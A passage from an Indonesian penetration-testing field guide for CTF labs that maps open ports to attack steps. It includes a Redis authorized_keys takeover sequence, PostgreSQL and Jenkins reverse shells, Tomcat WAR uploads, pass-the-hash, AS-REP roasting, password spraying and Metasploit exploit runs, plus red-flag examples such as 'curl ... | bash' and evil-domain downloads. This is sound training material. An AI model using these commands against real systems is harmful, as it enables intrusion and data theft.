          └── DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);
              COPY cmd_exec FROM PROGRAM '<reverse_shell_command>';
   └── 📁 NEXT WORKFLOW: [14c. PostgreSQL Exploitation Workflow — Master Field Guide](/docs/postgresql)
```

---

### 3.26 Kibana (Port 5601)
* **Pertanyaan Utama**: *"Apakah versi Kibana rentan terhadap Prototype Pollution / RCE (CVE-2019-7609)?"*
* **Tool Validasi**: Browser `http://$TARGET:5601/` ➔ Periksa versi di menu Management
```text
[ PORT 5601: KIBANA ]
   │
   └── Jika versi 5.6.15 / 6.6.1:
          └── Eksekusi CVE-2019-7609 Timelion Prototype Pollution exploit untuk reverse shell
   └── 📁 NEXT WORKFLOW: [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [32 — Deserialization Workflow 🔐](/docs/deserialization)
```

---

### 3.27 VNC (Port 5900)
* **Pertanyaan Utama**: *"Apakah VNC mengizinkan login tanpa password (Null Auth) atau file `vnc.passwd` bocor?"*
* **Tool Validasi**: `vncviewer $TARGET:5900` atau `nmap --script vnc-info,vnc-brute -p 5900 $TARGET`
```text
[ PORT 5900: VNC ]
   │
   └── Coba koneksi VNC: vncviewer -passwd /path/to/passwd_file $TARGET
   └── 📁 NEXT WORKFLOW: [12. RDP Exploitation & Remote Desktop Workflow — Master Field Guide](/docs/rdp)
```

---

### 3.28 WinRM (Port 5985 HTTP & Port 5986 HTTPS)
* **Pertanyaan Utama**: *"Apakah kredensial Windows yang didapat memiliki hak akses WinRM untuk mendapatkan remote PowerShell terminal?"*
* **Tool Validasi**: `evil-winrm -i $TARGET -u 'username' -p 'password'` atau `nxc winrm $TARGET -u 'user' -p 'pass'`
```text
[ PORT 5985 / 5986: WinRM ]
   │
   ├── [Q1: Kredensial Valid Ditemukan?]
   │      ├── YES ──> evil-winrm -i $TARGET -u <user> -p <pass> (INTERACTIVE POWERSHELL SHELL!)
   │      └── NO  ──> Cek Pass-The-Hash: evil-winrm -i $TARGET -u <user> -H <ntlm_hash>
   └── 📁 NEXT WORKFLOW: [🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc) & [🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement)
```

---

### 3.29 Redis In-Memory Database (Port 6379)
* **Pertanyaan Utama**: *"Apakah Redis berjalan tanpa autentikasi (unprotected mode) dan bisakah kita menulis file ke disk?"*
* **Tool Validasi**: `redis-cli -h $TARGET ping` (Jika respon `PONG`, berarti TIDAK ADA PASSWORD!)
```text
[ PORT 6379: REDIS ]
   │
   ├── [Q1: Respon 'PONG' Tanpa Autentikasi?]
   │      ├── YES (Jika target Linux)   ──> Tulis SSH Public Key ke /root/.ssh/authorized_keys
   │      │                                  CONFIG SET dir /root/.ssh/
   │      │                                  CONFIG SET dbfilename authorized_keys
   │      │                                  SET payload "\n\nssh-rsa AAAAB3NzaC1yc2E... attacker@parrot\n\n"
   │      │                                  SAVE (Langsung SSH sebagai ROOT!)
   │      ├── YES (Jika ada Web Server) ──> Tulis Web Shell ke /var/www/html/shell.php
   │      ├── YES (Jika target Windows) ──> Tulis Webshell atau DLL injection
   │      └── NO (AUTH Required)        ──> Bruteforce password redis via hydra
   └── 📁 NEXT WORKFLOW: [📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS](/docs/redis-and-mongodb)
```

---

### 3.30 Kubernetes API Server (Port 6443)
* **Pertanyaan Utama**: *"Apakah API server Kubernetes mengizinkan Anonymous Request (`system:anonymous`)?"*
* **Tool Validasi**: `curl -k https://$TARGET:6443/api/v1/namespaces/default/pods`
```text
[ PORT 6443: KUBERNETES ]
   │
   ├── [Q1: Respon 200 OK Mengembalikan JSON Pods?]
   │      ├── YES ──> Anonymous Access Aktif! Buat malicious Pod untuk escape ke Host node.
   │      └── NO (401/403) ──> Ekstrak ServiceAccount Token dari container pod yang sudah ditembus
   └── 📁 NEXT WORKFLOW: [🔌 30 — API Security Workflow](/docs/api-security) & [☁️ Bagian 0: Fondasi Cloud Security](/docs/cloud-enum)
```

---

### 3.31 HTTP Alt / Apache Tomcat (Port 8080) & HTTPS Alt (Port 8443)
* **Pertanyaan Utama**: *"Apakah ini Tomcat Web Application Manager (`/manager/html`), Jenkins, atau custom proxy?"*
* **Tool Validasi**: Browser `http://$TARGET:8080/` atau `curl -I http://$TARGET:8080/`
```text
[ PORT 8080 / 8443: HTTP-ALT ]
   │
   ├── Apache Tomcat Terdeteksi ──> Coba login /manager/html (tomcat:s3cret, admin:admin)
   │                                  └── Jika masuk, upload file `.war` payload untuk REVERSE SHELL!
   ├── Jenkins Terdeteksi       ──> Akses /script console untuk eksekusi Groovy reverse shell script
   └── Custom Web App           ──> Lanjut ke alur Web Enumeration standar
   └── 📁 NEXT WORKFLOW: [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [25 — File Upload Workflow](/docs/file-upload)
```

---

### 3.32 Jupyter Notebook (Port 8888)
* **Pertanyaan Utama**: *"Apakah Jupyter Notebook berjalan tanpa token autentikasi?"*
* **Tool Validasi**: Browser `http://$TARGET:8888/`
```text
[ PORT 8888: JUPYTER ]
   │
   └── Jika masuk langsung ke dashboard Notebook:
          └── Buat Notebook baru ➔ Buka Terminal / Eksekusi Python Reverse Shell
   └── 📁 NEXT WORKFLOW: [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [🖥️ 26 — Command Injection Workflow](/docs/command-injection)
```

---

### 3.33 PHP-FPM / SonarQube (Port 9000)
* **Pertanyaan Utama**: *"Apakah port 9000 mengekspos PHP-FPM FastCGI secara langsung (CVE-2019-11043) atau SonarQube default login?"*
* **Tool Validasi**: `nc -vn $TARGET 9000` atau `curl -I http://$TARGET:9000/`
```text
[ PORT 9000: PHP-FPM / SONARQUBE ]
   │
   ├── SonarQube Portal ──> Coba kredensial default admin:admin, ekstrak token API
   └── PHP-FPM Daemon   ──> Eksekusi script PoC CVE-2019-11043 untuk RCE via FastCGI
   └── 📁 NEXT WORKFLOW: [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [🖥️ 26 — Command Injection Workflow](/docs/command-injection)
```

---

### 3.34 Prometheus Metrics (Port 9090)
* **Pertanyaan Utama**: *"Informasi sensitif, host internal, atau credential apa yang terekspos di `/metrics`?"*
* **Tool Validasi**: `curl -s http://$TARGET:9090/metrics | grep -iE "pass|secret|user"`
```text
[ PORT 9090: PROMETHEUS ]
   │
   └── Analisis endpoint /targets dan /api/v1/targets untuk menemukan IP mesin internal lain
   └── 📁 NEXT WORKFLOW: [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon) & [🔌 30 — API Security Workflow](/docs/api-security)
```

---

### 3.35 Elasticsearch (Port 9200)
* **Pertanyaan Utama**: *"Apakah Elasticsearch mengizinkan query REST API tanpa autentikasi?"*
* **Tool Validasi**: `curl -s http://$TARGET:9200/_cat/indices?v`
```text
[ PORT 9200: ELASTICSEARCH ]
   │
   ├── [Q1: Daftar Index Database Muncul?]
   │      ├── YES ──> Dump seluruh data index: curl -s http://$TARGET:9200/<index_name>/_search?size=1000
   │      │            └── Cari password hash, user logs, session tokens
   │      └── NO  ──> Cek CVE RCE lama (CVE-2014-3120 / CVE-2015-1427)
   └── 📁 NEXT WORKFLOW: [📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS](/docs/redis-and-mongodb) & [🔌 30 — API Security Workflow](/docs/api-security)
```

---

### 3.36 MongoDB NoSQL Database (Port 27017)
* **Pertanyaan Utama**: *"Bisakah kita terhubung ke database MongoDB tanpa autentikasi?"*
* **Tool Validasi**: `mongosh mongodb://$TARGET:27017/`
```text
[ PORT 27017: MONGODB ]
   │
   ├── [Q1: Berhasil Masuk ke Prompt MongoDB?]
   │      ├── YES ──> show dbs; use admin; show collections; db.users.find().pretty();
   │      └── NO  ──> Cek NoSQL Injection pada aplikasi web
   └── 📁 NEXT WORKFLOW: [📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS](/docs/redis-and-mongodb)
```

---

### 3.37 Java JMX / SAP / Jenkins Agent (Port 50000)
* **Pertanyaan Utama**: *"Apakah port 50000 menjalankan JMX RMI Remote Management atau Jenkins JNLP slave listener?"*
* **Tool Validasi**: `nmap --script rmi-vuln-classloader,jmx-info -p 50000 $TARGET`
```text
[ PORT 50000: JMX / SAP ]
   │
   └── Gunakan tool beanshooter / ysoserial untuk eksploitasi Java Deserialization RCE
   └── 📁 NEXT WORKFLOW: [32 — Deserialization Workflow 🔐](/docs/deserialization)
```

---

## 🔀 Bagian 4: Kombinasi Port — Scenario Analysis

Ketika memindai target, Anda hampir selalu menemukan beberapa port terbuka bersamaan. Bagian ini menjelaskan secara rinci **KENAPA** urutan prioritas tertentu harus diambil, dilengkapi dengan diagram alur logika, alasan teknis, dan perintah konkret pada setiap skenario.

```text
+=============================================================================+
|                      CTF MULTI-PORT SCENARIO ANALYSIS                       |
+=============================================================================+
```

---

### 4.1 SCENARIO 1: Port 22 + 80 Terbuka (Pola Paling Dasar Linux Machine)

* **Deskripsi Situasi**:
  Target hanya mengekspos layanan Secure Shell (Port 22) dan Web Server HTTP standar (Port 80). Ini adalah tipikal mesin Linux standar di HackTheBox, TryHackMe, maupun server produksi modern.

```text
+-----------------------------------------------------------------------------+
|                         SCENARIO 1 ATTACK FLOW                              |
+-----------------------------------------------------------------------------+
   [ Port 22 (SSH) + Port 80 (HTTP) Open ]
                  │
                  ▼
   [ 1. Web Recon: Source Code, Comments, Directory Fuzzing ]
                  │
                  ├── Temukan Kredensial / Hash / Key ──┐
                  └── Dapatkan Foothold Web Shell ──────┤
                                                        ▼
                                           [ 2. Pivot ke SSH ]
                                                        │
                                                        ▼
                                           [ 3. Login User Shell (Port 22) ]
```

* **Penjelasan Logis (KENAPA Web Dulu, Bukan SSH?)**:
  * **SSH Membutuhkan Kredensial Valid**: Daemon OpenSSH modern tidak memiliki celah pre-authentication RCE. Melakukan brute-force password jutaan baris via Hydra akan memakan waktu berhari-hari, memicu firewall/fail2ban, dan hampir pasti sia-sia (*rabbit hole*).
  * **Web Adalah Sumber Kredensial**: Permukaan serangan aplikasi web (Port 80) sangat luas dan dibuat kustom. Developer sering kali meninggalkan kredensial, kunci SSH, atau celah logika di aplikasi web.

* **Apa yang Dicari di Web untuk Masuk ke SSH?**:
  1. **Source Code Comments**: Password atau username yang tertinggal pada komentar HTML (`<!-- TODO: fix auth for admin:P@ssw0rd123 -->`).
  2. **Direktori Cadangan / File Terekspos**: Direktori `/backup`, `/dev`, atau file `.git/`, `.env`, `config.php.bak`, `id_rsa`.
  3. **Form Login Rentan SQLi**: Celah SQL Injection untuk men-dump tabel `users` (username + hash password).
  4. **Username Harvesting**: Mengumpulkan nama karyawan dari halaman `/about-us`, `/team`, atau author postingan blog untuk wordlist spray.

* **Command Konkret per Langkah**:
```bash
# Langkah 1: Fingerprint teknologi web & header
whatweb http://$TARGET/
curl -s -I http://$TARGET/

# Langkah 2: Directory & file fuzzing intensif
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.txt,.bak,.old,.env

# Langkah 3: Ekstrak kredensial / private key dari web, set permission key, lalu login SSH
chmod 600 id_rsa
ssh -i id_rsa user@$TARGET
```

---

### 4.2 SCENARIO 2: Port 22 + 80 + 443 + 8080 (Multiple Web Ports)

* **Deskripsi Situasi**:
  Target menjalankan layanan SSH dan mengekspos 3 port web sekaligus (HTTP standar 80, HTTPS terenkripsi 443, dan HTTP alternatif 8080).

```text
+-----------------------------------------------------------------------------+
|                         SCENARIO 2 DECISION FLOW                            |
+-----------------------------------------------------------------------------+
   [ Port 80, 443, 8080 Terbuka ]
                  │
                  ▼
   [ Cek Status Code & Header Serentak ]
                  │
                  ├── Port 80   ──> 301/302 Redirect ke 443 ──> Abaikan Port 80
                  ├── Port 443  ──> 200 OK (Corporate Landing Page) ──> Background Fuzz
                  └── Port 8080 ──> 200/401/403 (Admin Panel/Tomcat) ──> PRIORITAS #1!
```

* **Penjelasan Logis (Cara Membedakan Konten & Prioritisasi)**:
  * **Identifikasi Cepat Redirect vs Konten Berbeda**: Gunakan satu baris `curl -I` serentak. Port yang merespon `301 Moved Permanently` dengan header `Location: https://...` hanyalah redirector; jangan buang waktu fuzzing di sana.
  * **Prioritas Response Code**: `200 OK` (dengan konten aplikasi kustom) > `401 Unauthorized` (Basic Auth yang bisa ditebak default creds) > `301/302 Redirect` (hanya ikuti URL tujuannya).
  * **Keistimewaan Port 8080**: Port 8080 hampir selalu menjalankan *Admin Dashboard*, *Apache Tomcat Manager*, *Jenkins*, atau service backend internal yang konfigurasi keamanannya jauh lebih longgar dibanding landing page utama di port 80/443.

* **Command Konkret per Langkah**:
```bash
# Langkah 1: Cek respon semua port web sekaligus
curl -s -k -I http://$TARGET:80 http://$TARGET:8080 https://$TARGET:443 | grep -iE "HTTP/|Server:|Location:|Content-Length:"

# Langkah 2: Inspeksi sertifikat SSL di Port 443 untuk mengungkap domain/VHost internal
openssl s_client -connect $TARGET:443 -servername $TARGET </dev/null 2>/dev/null | openssl x509 -noout -text | grep -iE "subject:|dns:"

# Langkah 3: Fuzzing VHost khusus pada port target
ffuf -u http://$TARGET:8080/ -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234
```

---

### 4.3 SCENARIO 3: Port 22 + 139 + 445 (Windows atau Linux Samba?)

* **Deskripsi Situasi**:
  Target mengekspos port remote shell (22) dan port file sharing SMB (139/445). Anda harus segera menentukan apakah target merupakan mesin Windows atau Linux Samba File Server.

```text
+-----------------------------------------------------------------------------+
|                         SCENARIO 3 ATTACK FLOW                              |
+-----------------------------------------------------------------------------+
   [ Port 22 + 139 + 445 Open ]
                  │
                  ▼
   [ Analisis TTL Ping & Nmap / NetExec SMB Banner ]
                  │
                  ├── TTL ~64  & Banner "Samba 4.x" ──> Linux Samba Server
                  └── TTL ~128 & Banner "Windows 10/Server" ──> Windows Server
                  │
                  ▼
   [ SMB Enumeration Flow ]
   Null Session ➔ Share Listing ➔ Download Files ➔ Cari Kredensial ➔ Login SSH
```

* **Cara Membedakan OS Target dari Output Nmap & Network Layer**:
  * **Ping TTL (Time To Live)**:
    * `TTL = 64` (atau 63 setelah 1 hop): Pasti **Linux**.
    * `TTL = 128` (atau 127 setelah 1 hop): Pasti **Windows**.
  * **Banner SMB**:
    * Linux: Menampilkan string eksplisit seperti `Unix (Samba 4.11.6-Ubuntu)`, hostname dalam huruf kecil semua.
    * Windows: Menampilkan string build seperti `Windows 10 Enterprise 19041`, `Windows Server 2019`, workgroup default `WORKGROUP`, hostname huruf besar (*all caps*).

* **Alur Lengkap Enumerasi SMB**:
  1. **Null Session & Anonymous Share List**: Cek apakah share bisa diakses tanpa password.
  2. **Masuk ke Share**: Periksa file `.conf`, backup script, atau database dump.
  3. **Cek Hak Tulis (*Write Permission*)**: Jika ada hak tulis di home folder user, langsung upload SSH Public Key ke `.ssh/authorized_keys`.

* **Command Konkret per Langkah**:
```bash
# Langkah 1: Cek TTL target
ping -c 1 $TARGET

# Langkah 2: Identifikasi OS & banner SMB via NetExec
nxc smb $TARGET

# Langkah 3: Listing share tanpa password (Null Session)
smbclient -N -L //$TARGET/

# Langkah 4: Masuk ke share yang ditemukan dan unduh seluruh file
smbclient //$TARGET/public -N -c 'recurse ON; prompt OFF; mget *'
```

---

### 4.4 SCENARIO 4: Port 80 + 3306 (Web + Database Exposed)

* **Deskripsi Situasi**:
  Target membuka port web (80) dan port database MySQL (3306) langsung ke jaringan.

```text
+-----------------------------------------------------------------------------+
|                         SCENARIO 4 DECISION FLOW                            |
+-----------------------------------------------------------------------------+
   [ Port 80 + 3306 Terbuka ]
                  │
                  ▼
   [ 1. Quick Test Root MySQL (5 Detik) ]
                  │
                  ├── Berhasil (Tanpa Pass/Default) ──> Ekstrak DB & Write Shell
                  └── Gagal (Host is not allowed) ────┐
                                                      ▼
                                       [ 2. Eksplorasi Aplikasi Web ]
                                                      │
                                                      ▼
                                       [ 3. Temukan SQLi / File .env / wp-config.php ]
                                                      │
                                                      ▼
                                       [ 4. Gunakan Password untuk Login MySQL Remote ]
```

* **Penjelasan Logis (Kenapa MySQL Terbuka ke Luar & Urutan Prioritas)**:
  * **Mengapa MySQL Terbuka Itu Anomali?**: Secara bawaan, database MySQL hanya mendengarkan pada `127.0.0.1` (localhost). Jika port 3306 terbuka ke internet (`0.0.0.0`), ini menandakan developer mengonfigurasi remote access secara manual atau terjadi miskonfigurasi firewall.
  * **Kenapa Web Tetap Diprioritaskan?**: Mayoritas database MySQL membatasi host yang boleh login (`'root'@'localhost'`). Menghabiskan waktu brute-force di port 3306 sering menghasilkan error `Host is not allowed to connect`. Prioritaskan web untuk menemukan kredensial database di file konfigurasi (`.env`, `wp-config.php`) atau memanfaatkan celah SQL Injection. Begitu kredensial didapat, coba login ke port 3306 (*password reuse*).

* **Command Konkret per Langkah**:
```bash
# Langkah 1: Quick check remote login root tanpa password (5 detik)
mysql -h $TARGET -u root -p

# Langkah 2: Audit web untuk mencari file kredensial konfigurasi
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .env,.php.bak,.config,.json

# Langkah 3: Jika kredensial didapat dari web, login remote ke MySQL
mysql -h $TARGET -u dbuser -p'Pass123!' -e "SHOW DATABASES; USE appdb; SELECT * FROM users;"
```

---

### 4.5 SCENARIO 5: Port 22 + 80 + 443 + 8080 + 8443 (Banyak Port Web)

* **Deskripsi Situasi**:
  Target mengekspos 4 hingga 5 web service sekaligus pada port standar dan alternatif. Pemula sering bingung menentukan web mana yang merupakan pintu masuk utama.

```text
+-----------------------------------------------------------------------------+
|                         SCENARIO 5 PIPELINE                                 |
+-----------------------------------------------------------------------------+
   [ Multi-Web Port Sweep ]
                  │
                  ▼
   [ Bash Loop: Cek Status Code, Redirect, & Response Size ]
                  │
                  ├── Filter 301/302 Redirect ──> Catat URL tujuan, skip fuzzing awal
                  ├── Filter Ukuran Response Standar (Apache/Nginx Default) ──> Skip
                  └── Prioritaskan Port dengan Unique Title / Custom Framework!
```

* **Command Bash Loop untuk Mengidentifikasi Semua Web Sekaligus**:
```bash
for port in 80 443 8080 8443; do
  echo "=== PORT $port ===" 
  curl -sk -o /dev/null -w "Status: %{http_code} | Target URL: %{url_effective} | Size: %{size_download} bytes\n" \
    http://$TARGET:$port/ 2>/dev/null
done
```

* **Metode Prioritisasi**:
  1. **HTTP Status Code**: Utamakan respon `200 OK` dan `401 Unauthorized` (Basic Auth).
  2. **Response Size yang Berbeda**: Jika port 80 dan 443 memiliki ukuran byte yang sama persis (misal: 10729 bytes), keduanya menampilkan landing page yang identik. Jika port 8080 memiliki ukuran 1250 bytes, port 8080 adalah aplikasi yang berbeda dan harus diserang lebih dulu.
  3. **Server Header**: Bandingkan `Server: Apache` vs `Server: Werkzeug/Python` atau `Server: Jetty`. Server berbasis Python/Node.js/Jetty sering kali merupakan API backend atau dev server yang lebih rentan.

---

### 4.6 SCENARIO 6: Port 445 + 88 + 389 + 636 + 3268 (Active Directory Domain Controller)

* **Deskripsi Situasi**:
  Target mengekspos kombinasi port Kerberos (88), LDAP (389/636), Global Catalog (3268), dan SMB (445). Ini adalah **signature pasti dari Domain Controller (DC) Windows Active Directory**.

```text
+-----------------------------------------------------------------------------+
|                         SCENARIO 6 (AD DC) FLOW                             |
+-----------------------------------------------------------------------------+
   [ Port 88, 389, 445, 5985 Open (Active Directory Domain Controller) ]
                  │
                  ▼
   [ 1. NetExec SMB ] ──> Dapatkan Nama Domain FQDN & NetBIOS
                  │
                  ▼
   [ 2. Update /etc/hosts ] ──> Masukkan IP dan FQDN (misal: corp.local)
                  │
                  ▼
   [ 3. Kerbrute Userenum ] ──> Validasi Daftar Username Valid (Port 88)
                  │
                  ├── AS-REP Roasting ──> impacket-GetNPUsers (Crack Hash TGT)
                  └── Password Spraying ──> nxc smb $TARGET -u users.txt -p 'Pass123'
                  │
                  ▼
   [ 4. WinRM Access / BloodHound Data Collection ] ──> bloodhound-python
```

* **Langkah Demi Langkah dari Zero Knowledge**:
  1. **Dapatkan FQDN Domain**: Ekstrak domain name dari banner SMB.
  2. **Daftarkan ke `/etc/hosts`**: Semua tool AD (Kerbrute, Impacket, BloodHound) membutuhkan domain name yang valid.
  3. **Enumerasi User via Kerberos (Port 88)**: Gunakan Kerbrute untuk memverifikasi username yang valid secara instan tanpa memicu lockout count.
  4. **AS-REP Roasting**: Periksa apakah ada user dengan opsi *Do not require Kerberos preauthentication* aktif.
  5. **Password Spraying**: Uji 1 password umum (misal: `SeasonYear!`) terhadap semua user valid.

* **Command Konkret per Langkah**:
```bash
# Langkah 1: Ekstrak nama domain
nxc smb $TARGET

# Langkah 2: Tambahkan domain ke /etc/hosts
sudo bash -c "echo '$TARGET corp.local dc01.corp.local' >> /etc/hosts"

# Langkah 3: Enumerasi user via Kerbrute
kerbrute userenum --dc dc01.corp.local -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Langkah 4: AS-REP Roasting tanpa password
impacket-GetNPUsers corp.local/ -usersfile valid_users.txt -format hashcat -no-pass -dc-ip $TARGET -outputfile asrep.hashes

# Langkah 5: Password Spraying terukur via NetExec
nxc smb $TARGET -u valid_users.txt -p 'Welcome2026!' --continue-on-success
```

---

### 4.7 SCENARIO 7: Port Non-Standard (9001, 31337, dll) (Unknown Service)

* **Deskripsi Situasi**:
  Nmap menemukan port tinggi yang tidak lazim (misal: 9001, 31337, 60000) dan menandai status service sebagai `unknown` atau `tcpwrapped`.

```text
+-----------------------------------------------------------------------------+
|                         SCENARIO 7 PROBING LAYERS                           |
+-----------------------------------------------------------------------------+
   [ Port Random / Non-Standard Open ]
                  │
                  ▼
   [ Layer 1: Netcat Raw TCP Probe ] ──> nc -vn -w 3 $TARGET [PORT]
                  │
                  ├── Respon Prompt/Menu Text ──> PWN Binary Challenge / Custom Shell
                  └── Diam / Binary Garbage ──┐
                                              ▼
   [ Layer 2: Raw HTTP Probe ] ───────> curl -i http://$TARGET:[PORT]/
                  │
                  ├── Respon HTTP Header/HTML ──> Custom Web App / REST API
                  └── Respon SSL Handshake Error ──┐
                                                   ▼
   [ Layer 3: SSL/TLS Probe ] ────────> openssl s_client -connect $TARGET:[PORT]
                  │
                  └── Sertifikat SSL Valid ──> Akses via HTTPS (https://...)
```

* **Cara Mengidentifikasi Service Berdasarkan Karakter Respon**:
  * **HTTP Response (`HTTP/1.1 200 OK` / `400 Bad Request`)**: Service web atau REST API kustom (Node.js, Flask, Go HTTP).
  * **SSH Banner (`SSH-2.0-OpenSSH...`)**: Daemon SSH sengaja dipindahkan ke port tinggi.
  * **Text Prompt Interaktif**: Program binary C/C++ yang diekspos via `socat` / `xinetd` (CTF PWN Challenge).
  * **Diam Total (*Silent*)**: Port membutuhkan format byte tertentu (*magic handshake bytes*), jalankan `nmap -sV --version-all` untuk memaksa pengiriman seluruh signature probe Nmap.

* **Command Konkret per Langkah**:
```bash
# Layer 1: Raw TCP banner grab
nc -vn -w 3 $TARGET 9001

# Layer 2: HTTP probe
curl -i http://$TARGET:9001/

# Layer 3: SSL inspection
openssl s_client -connect $TARGET:9001 </dev/null

# Layer 4: Aggressive Nmap service scan
sudo nmap -sV -sC --version-all -p 9001 $TARGET
```

---

### 4.8 SCENARIO 8: Port 21 + 22 + 80 (Classic HTB Easy Machine Pattern)

* **Deskripsi Situasi**:
  Kombinasi klasik tiga serangkai: FTP (21), SSH (22), dan HTTP (80). Ini adalah pola desain lab mesin Linux Easy yang paling sering muncul di HackTheBox dan TryHackMe.

```text
+-----------------------------------------------------------------------------+
|                         CLASSIC HTB EASY PIPELINE                           |
+=============================================================================+
 [Menit 00-05] Nmap Fast Scan ➔ Port 21, 22, 80 Terbuka
       │
 [Menit 05-10] Web Surface Recon (Browser, WhatWeb, /robots.txt)
       │
 [Menit 10-20] Directory Fuzzing via FFUF (Background Process)
       │
 [Menit 20-25] FTP Anonymous Login (Port 21) ➔ Download backup.zip / notes.txt
       │
 [Menit 25-35] Analisis File Loot (Unzip, Ekstrak Kredensial / Hash)
       │
 [Menit 35-45] Akses Initial Shell (Login SSH dengan Password / Web Shell RCE)
       │
 [Menit 45-60] Internal Recon (LinPEAS) ➔ Privilege Escalation ke ROOT!
+-----------------------------------------------------------------------------+
```

* **Command dan Tindakan di Setiap Fase**:
```bash
# [Menit 0-5]: Fast Port Discovery & Targeted Scan
sudo nmap -sS -T4 -Pn -n -v $TARGET -oN nmap/fast.nmap
sudo nmap -sC -sV -p 21,22,80 -Pn $TARGET -oA nmap/services

# [Menit 5-10]: Web Surface Analysis
whatweb http://$TARGET/
curl -s http://$TARGET/robots.txt

# [Menit 10-20]: Fuzzing Direktori Tersembunyi (Disarankan di pane Tmux terpisah untuk visibilitas)
# NOTE: Gunakan tmux pane terpisah (Ctrl+b %) agar output match HTTP terlihat live tanpa tertimpa
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.txt,.bak -o web/fuzz.json

# [Menit 20-25]: Eksploitasi FTP Anonymous Access
ftp -n $TARGET <<EOF
user anonymous anonymous
binary
prompt OFF
mget *
quit
EOF

# [Menit 25-35]: Analisis File Loot
cat *.txt
unzip -P 'password_jika_ada' *.zip

# [Menit 35-45]: Login SSH dengan Kredensial yang Ditemukan
ssh username@$TARGET

# [Menit 45-60]: Privilege Escalation
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

---

## 🔎 Bagian 5: CVE & Exploit Lookup Workflow

Setelah mengetahui nama software dan nomor versinya secara presisi, gunakan alur riset exploit berikut:

```text
+=============================================================================+
|                      CVE & EXPLOIT RESEARCH PIPELINE                        |
+=============================================================================+
```

### 5.1 Searchsploit — Offline Exploit Database

Searchsploit adalah command-line search utility untuk Exploit-DB lokal yang telah terinstal di Parrot OS:

* **Contoh Output Nyata Searchsploit**:
```text
$ searchsploit apache 2.4.50
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Executi | php/webapps/50512.py
Apache HTTP Server 2.4.49/2.4.50 - Remote Code Execution (RCE)   | multiple/webapps/50406.sh
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

* **Command Workflow Lengkap**:
```bash
# 1. Update database exploit-db lokal secara berkala
sudo searchsploit -u

# 2. Cari exploit berdasarkan nama software dan nomor versi utama
searchsploit vsftpd 2.3.4

# 3. Filter hasil untuk menghindari DoS dan hanya menampilkan RCE
searchsploit proftpd 1.3.5 | grep -iE "rce|remote|execution" | grep -iv "dos"

# 4. Membaca kode exploit dan petunjuk penggunaan tanpa keluar terminal
searchsploit -x php/webapps/50512.py

# 5. Menyalin (mirror) exploit ke folder kerja aktif saat ini
searchsploit -m php/webapps/50512.py

# 6. Pencarian otomatis dari seluruh service pada file output Nmap XML
searchsploit --nmap nmap/services.xml
```

* **Cara Memodifikasi Kode Exploit**:
  * Buka exploit dengan text editor (`nano 50512.py`).
  * Cari variabel konfigurasi target: `RHOST` (IP Target), `RPORT` (Port Target), `LHOST` (IP `tun0` Anda), `LPORT` (Port listener Netcat Anda).
  * **Red Flags Exploit Berbahaya**: Hati-hati jika di dalam kode terdapat baris `os.system("curl ... | sh")`, `wget http://evil-domain/...`, atau string base64 panjang yang di-decode secara mencurigakan.

---

### 5.2 Google Dorking untuk CVE

Gunakan teknik Google Dorking terstruktur untuk menemukan PoC publik dan writeup teknis:

```text
Format Query Pencarian Paling Efektif:
1. "[software] [version] exploit site:github.com"
   Contoh: "Apache 2.4.49" exploit site:github.com

2. "CVE-XXXX-XXXX poc python"
   Contoh: "CVE-2021-41773" poc python

3. "[software] [version] RCE writeup"
   Contoh: "Werkzeug 0.16.1" PIN exploit writeup
```

* **Kriteria Evaluasi PoC**:
  * ✅ **Tanda PoC Andal & Aman**: Memiliki banyak GitHub Stars, commit terbaru, README dokumentasi yang jelas, dan source code mudah dibaca baris demi baris.
  * ❌ **Red Flag PoC Palsu / Backdoor**: Kode Python terenkripsi (*obfuscated*), ada perintah pipe bash langsung (`curl ... | bash`), tidak ada penjelasan cara kerja, dan akun pengunggah baru dibuat beberapa hari.

---

### 5.3 Metasploit Search Workflow

Navigasi pencarian modul di dalam konsol Metasploit (`msfconsole`):

```bash
# 1. Buka msfconsole
msfconsole -q

# 2. Cari modul exploit berdasarkan nama atau nomor CVE
msf6 > search type:exploit name:vsftpd
msf6 > search cve:2017-0143

# 3. Membaca peringkat keandalan modul (Rank Column):
#    - Excellent : Exploit andal, payload stabil, hampir tidak pernah membuat service crash.
#    - Great     : Exploit memiliki auto-target detection.
#    - Good      : Exploit stabil untuk versi software tertentu.
#    - Normal    : Exploit standar.
#    - Average   : Payload kurang stabil, berpotensi memicu service crash.
#    - Low       : Peluang keberhasilan < 50% atau rawan DoS.

# 4. Membaca detail modul dan opsi yang dibutuhkan
msf6 > info exploit/unix/ftp/vsftpd_234_backdoor

# 5. Memilih modul dan mengonfigurasi parameter
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.11.205
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST tun0
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > check
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

---

### 5.4 GitHub PoC Search & Audit Keamanan

Pencarian langsung di GitHub Search Bar:
